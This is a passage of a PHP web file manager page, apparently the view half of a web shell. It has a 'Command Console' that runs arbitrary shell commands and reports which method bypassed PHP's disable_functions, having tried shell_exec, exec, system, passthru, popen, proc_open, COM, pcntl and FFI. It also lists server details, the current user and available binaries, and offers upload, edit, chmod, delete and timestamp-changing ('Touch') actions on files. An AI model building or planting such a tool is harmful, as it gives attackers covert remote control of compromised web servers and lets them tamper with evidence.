        </div><div class="card-body p-0">
            <?php if ($vis === 'img'): ?>
                <div class="text-center bg-dark p-4" style="min-height:300px">
                    <img src="<?=mkUrl(array('action' => 'preview', 'path' => $CUR, 'file' => $view))?>" alt="<?=htmlspecialchars($view)?>" style="max-height:65vh" class="img-fluid">
                </div>
            <?php elseif ($vis === 'bin'): ?>
                <div class="alert alert-warning m-3 mb-0">Binary file cannot be displayed as text. Use the download button.</div>
            <?php else: ?>
                <pre class="viewtxt"><?=htmlspecialchars($vct)?></pre>
            <?php endif; ?>
        </div></div>
        <?php endif; ?>

        <?php if ($edit !== ''): ?>
        <div class="card mb-3"><div class="card-header py-2 d-flex justify-content-between align-items-center">
            <span><i class="bi bi-pencil-square me-1"></i> Edit: <code><?=htmlspecialchars($edit)?></code></span>
            <a class="btn btn-sm btn-outline-secondary" href="<?=mkUrl(array('path' => $CUR))?>"><i class="bi bi-x-lg"></i> Close</a>
        </div>
        <form method="post">
            <input type="hidden" name="act" value="save">
            <input type="hidden" name="name" value="<?=htmlspecialchars($edit)?>">
            <textarea name="content" class="editor" spellcheck="false"><?=htmlspecialchars($ect)?></textarea>
            <div class="p-2 d-flex justify-content-between align-items-center border-top">
                <small class="text-muted"><i class="bi bi-info-circle"></i> Ctrl+S to save</small>
                <button class="btn btn-primary btn-sm"><i class="bi bi-check-lg"></i> Save</button>
            </div>
        </form></div>
        <?php endif; ?>

        <?php if ($con): ?>
        <div class="tcard p-3 mb-3">
            <div class="d-flex justify-content-between align-items-center flex-wrap mb-2 gap-2">
                <h6 class="m-0"><i class="bi bi-terminal me-1 text-success"></i> Command Console
                    <small class="text-muted">— running in <code><?=htmlspecialchars($CUR)?></code></small>
                </h6>
                <div class="d-flex gap-1">
                    <a class="btn btn-sm btn-outline-success" href="<?=mkUrl(array('console' => '', 'path' => $CUR))?>"><i class="bi bi-brush"></i> Clear</a>
                    <a class="btn btn-sm btn-outline-secondary" href="<?=mkUrl(array('path' => $CUR))?>"><i class="bi bi-x-lg"></i> Close</a>
                </div>
            </div>
            <?php if ($disf): ?>
            <div class="small text-muted mb-2">Disabled Functions: <?php foreach ($disf as $f) echo '<span class="pm text-danger">' . htmlspecialchars($f) . '</span> '; ?></div>
            <?php else: ?>
            <div class="small text-muted mb-2"><span class="pm text-success"><i class="bi bi-check-circle"></i></span> No functions blocked (disable_functions empty)</div>
            <?php endif; ?>
            <form method="post" class="d-flex gap-2 mb-2">
                <div class="input-group input-group-sm flex-grow-1">
                    <span class="input-group-text bg-dark text-success border-0 font-monospace">$</span>
                    <input class="form-control font-monospace" type="text" name="perintah" value="<?=htmlspecialchars(isset($_POST['perintah']) ? $_POST['perintah'] : '')?>" placeholder="e.g. php -v | dir | whoami" autocomplete="off" autofocus>
                </div>
                <button class="btn btn-sm btn-danger" name="cmd"><i class="bi bi-play-fill"></i> Run</button>
            </form>
            <?php if ($chtec !== ''): ?>
            <div class="small mb-2">
                <?php if ($chtec === 'ALL_FAILED'): ?>
                <span class="text-danger"><i class="bi bi-shield-x"></i> Failed — all execution functions blocked by disable_functions</span>
                <?php else: ?>
                <span class="text-success"><i class="bi bi-shield-check"></i> Bypass method: <b><?=htmlspecialchars($chtec)?></b></span>
                <?php endif; ?>
                <span class="text-muted"> | Functions tested: shell_exec, exec, system, passthru, popen, proc_open, COM, pcntl, FFI</span>
            </div>
            <?php endif; ?>
            <div class="console"><?=htmlspecialchars($co)?></div>
        </div>
        <?php endif; ?>

        <?php if ($toolHtml !== ''): echo $toolHtml; endif; ?>

        <div class="status">
            <div class="st"><i class="bi bi-folder-fill text-warning"></i><div><b><?=$nDir?></b><small>Folders</small></div></div>
            <div class="st"><i class="bi bi-file-earmark text-primary"></i><div><b><?=$nFil?></b><small>Files</small></div></div>
            <div class="st"><i class="bi bi-hdd text-success"></i><div><b><?=fmt($nSiz)?></b><small>Total Size</small></div></div>
        </div>

        <div class="mb-3">
            <div class="collapse mt-2" id="srvinfo">
                <div class="tcard p-3">
                    <div class="row g-2">
                        <?php foreach ($sv as $k => $v): ?>
                        <div class="col-md-4"><div class="fw-semibold text-muted" style="font-size:11px"><?=$k?></div><div class="text-break"><?=htmlspecialchars($v)?></div></div>
                        <?php endforeach; ?>
                    </div>
                    <hr class="my-3">
                    <div class="small text-muted mb-1">Disabled Functions: <?=count($disf)?> | Loaded Extensions: <?=count($exts)?> | User: <?=htmlspecialchars(getUser())?></div>
                    <div class="d-flex flex-wrap gap-1 mb-2">
                        <?php if (!$disf) echo '<span class="st2 text-success"><i class="bi bi-check-circle"></i> None</span>';
                        else foreach ($disf as $f) echo '<span class="pm text-danger">' . htmlspecialchars($f) . '</span>'; ?>
                    </div>
                    <div class="d-flex flex-wrap gap-1">
                        <?php foreach ($bins as $b => $ok): ?>
                        <span class="pm <?=$ok ? 'text-success' : 'text-muted'?>"><i class="bi bi-<?=$ok ? 'check' : 'x'?>"></i> <?=$b?></span>
                        <?php endforeach; ?>
                    </div>
                </div>
            </div>
        </div>

        <div class="tcard">
            <div style="overflow:auto">
            <table>
                <thead><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr></thead>
                <tbody>
                <?php if (!$items): ?>
                    <tr><td colspan="5"><div class="text-center text-muted py-4"><i class="bi bi-folder-x d-block mb-2" style="font-size:34px"></i>Empty folder</div></td></tr>
                <?php else: ?>
                    <?php foreach ($items as $it):
                        $nm = $it['n']; $q = urlencode($nm); $js = addslashes($nm);
                        $open = mkUrl(array('path' => rtrim($CUR . '/' . $nm, '/')));
                        $self = $isBase && $nm === 'index.php'; ?>
                    <tr>
                        <td>
                            <i class="bi <?=icon($nm, $it['d'])?> me-1"></i>
                            <?php if ($it['d']): ?>
                                <a class="fn" href="<?=$open?>"><?=htmlspecialchars($nm)?></a>
                            <?php elseif ($self): ?>
                                <?=htmlspecialchars($nm)?>
                            <?php else: ?>
                                <a class="fn" href="<?=mkUrl(array('path' => $CUR, 'edit' => $q))?>" title="Click to edit"><?=htmlspecialchars($nm)?></a>
                            <?php endif; ?>
                        </td>
                        <td class="text-muted"><?=$it['d'] ? '-' : fmt($it['s'])?></td>
                        <td><span class="pm" title="<?=pm($it['pm'])?>"><?=$it['pm']?></span></td>
                        <td class="text-muted"><?=date('d M Y H:i', $it['mt'])?></td>
                        <td>
                            <?php if ($it['d']): ?>
                            <a class="ic" href="<?=$open?>" title="Open"><i class="bi bi-folder2-open"></i></a>
                            <?php else: ?>
                            <a class="ic" href="<?=mkUrl(array('path' => $CUR, 'view' => $q))?>" title="View"><i class="bi bi-eye"></i></a>
                            <?php if (!$self): ?><a class="ic" href="<?=mkUrl(array('path' => $CUR, 'edit' => $q))?>" title="Edit"><i class="bi bi-pencil"></i></a><?php endif; ?>
                            <a class="ic" href="<?=mkUrl(array('action' => 'download', 'path' => $CUR, 'file' => $q))?>" title="Download"><i class="bi bi-download"></i></a>
                            <?php endif; ?>
                            <button class="ic" title="Rename" onclick="rn('<?=$js?>')"><i class="bi bi-pencil-square"></i></button>
                            <button class="ic" title="Move" onclick="mv('<?=$js?>')"><i class="bi bi-arrows-move"></i></button>
                            <button class="ic" title="Copy" onclick="cp('<?=$js?>')"><i class="bi bi-copy"></i></button>
                            <button class="ic" title="Compress ZIP" onclick="zp('<?=$js?>')"><i class="bi bi-file-earmark-zip"></i></button>
                            <?php if (!$it['d'] && strtolower(pathinfo($nm, PATHINFO_EXTENSION)) === 'zip'): ?>
                            <button class="ic" title="Extract" onclick="uz('<?=$js?>')"><i class="bi bi-archive"></i></button>
                            <?php endif; ?>
                            <button class="ic" title="Touch" onclick="tc('<?=$js?>')"><i class="bi bi-clock"></i></button>
                            <button class="ic" title="Permissions" onclick="ch('<?=$js?>', '<?=$it['pm']?>')"><i class="bi bi-key"></i></button>
                            <button class="ic dg" title="Delete" onclick="dl('<?=$js?>')"><i class="bi bi-trash"></i></button>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                <?php endif; ?>
                </tbody>
            </table>
            </div>
        </div>
    </div>
</div>
</div>

<div class="modal fade" id="gmodal" tabindex="-1"><div class="modal-dialog modal-dialog-centered"><div class="modal-content">
    <div class="modal-header"><h6 class="modal-title" id="gtitle"></h6><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
    <div class="modal-body" id="gbody"></div>
</div></div></div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
var DIRS = <?=json_encode($dirs)?>;
var gM = null;
function mf(t, h){ document.getElementById('gtitle').textContent = t; document.getElementById('gbody').innerHTML = h; if (!gM) gM = new bootstrap.Modal(document.getElementById('gmodal')); gM.show(); }
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;'); }
function dl(n){ mf('Delete', '<p>Are you sure you want to delete <b>'+esc(n)+'</b>?</p><form method="post"><input type="hidden" name="act" value="delete"><input type="hidden" name="name" value="'+esc(n)+'"><button class="btn btn-danger w-100">Delete</button></form>'); }
function rn(n){ mf('Rename', '<form method="post"><input type="hidden" name="act" value="rename"><input type="hidden" name="name" value="'+esc(n)+'"><div class="mb-2"><label class="form-label small text-muted">New name</label><input class="form-control" type="text" name="new" value="'+esc(n)+'" required></div><button class="btn btn-primary w-100">Rename</button></form>'); }
function zp(n){ mf('Compress ZIP', '<p>Compress <b>'+esc(n)+'</b> into a .zip archive?</p><form method="post"><input type="hidden" name="act" value="zip"><input type="hidden" name="name" value="'+esc(n)+'"><button class="btn btn-primary w-100">Compress</button></form>'); }
function uz(n){ mf('Extract ZIP', '<p>Extract <b>'+esc(n)+'</b>?</p><form method="post"><input type="hidden" name="act" value="unzip"><input type="hidden" name="name" value="'+esc(n)+'"><button class="btn btn-primary w-100">Extract</button></form>'); }
function tc(n){ var d=new Date(),p=function(x){return(x<10?'0':'')+x;},now=d.getFullYear()+'-'+p(d.getMonth()+1)+'-'+p(d.getDate())+'T'+p(d.getHours())+':'+p(d.getMinutes());
    mf('Touch', '<form method="post"><input type="hidden" name="act" value="touch"><input type="hidden" name="name" value="'+esc(n)+'"><div class="mb-2"><label class="form-label small text-muted">Modification time</label><input class="form-control" type="datetime-local" name="ts" value="'+now+'"></div><button class="btn btn-primary w-100">Apply</button></form>'); }
function ch(n,pmv){ mf('Permissions', '<form method="post"><input type="hidden" name="act" value="chmod"><input type="hidden" name="name" value="'+esc(n)+'"><div class="mb-2"><label class="form-label small text-muted">Permissions (octal)</label><input class="form-control" name="perms" value="'+esc(pmv||'0755')+'" pattern="[0-7]{3,4}" required></div><button class="btn btn-primary w-100">Change</button></form>'); }
function ds(){ var o='<option value="">— choose destination folder —</option>'; for(var i=0;i<DIRS.length;i++) o+='<option value="'+esc(DIRS[i])+'">'+esc(DIRS[i])+'</option>'; return '<select class="form-select mb-2" name="to" required>'+o+'</select>'; }
function mv(n){ mf('Move to...', '<form method="post"><input type="hidden" name="act" value="move"><input type="hidden" name="name" value="'+esc(n)+'">'+ds()+'<button class="btn btn-primary w-100">Move</button></form>'); }
function cp(n){ mf('Copy to...', '<form method="post"><input type="hidden" name="act" value="copy"><input type="hidden" name="name" value="'+esc(n)+'">'+ds()+'<button class="btn btn-primary w-100">Copy</button></form>'); }
function newD(){ mf('New Folder', '<form method="post"><input type="hidden" name="act" value="folder"><div class="mb-2"><label class="form-label small text-muted">Folder name</label><input class="form-control" type="text" name="new" placeholder="folder name" required></div><button class="btn btn-primary w-100">Create Folder</button></form>'); }
function newF(){ mf('New File', '<form method="post"><input type="hidden" name="act" value="file"><div class="mb-2"><label class="form-label small text-muted">File name</label><input class="form-control" type="text" name="new" placeholder="e.g. file.txt" required></div><button class="btn btn-primary w-100">Create File</button></form>'); }
function upld(){ mf('Upload', '<form method="post" enctype="multipart/form-data"><input type="hidden" name="act" value="upload"><div class="mb-2"><input class="form-control" type="file" name="files[]" multiple required></div><button class="btn btn-primary w-100">Upload</button></form>'); }
function tgt(){ var t = document.documentElement.getAttribute('data-bs-theme'); theme(t==='dark' ? 'light' : 'dark'); }
function theme(t){ document.documentElement.setAttribute('data-bs-theme', t); var i=document.getElementById('ti'); if(i) i.className = t==='dark' ? 'bi bi-sun' : 'bi bi-moon-stars'; try{localStorage.setItem('fm-theme',t);}catch(e){} }
(function(){ var t; try{ t=localStorage.getItem('fm-theme'); }catch(e){} if(t!=='dark'&&t!=='light') t=(window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches)?'dark':'light'; theme(t); })();
document.addEventListener('keydown', function(e){ if(e.ctrlKey && (e.key==='s'||e.key==='S')){ var t=document.querySelector('textarea[name="content"]'); if(t){ e.preventDefault(); t.form.submit(); } } });
</script>
</body>
</html>
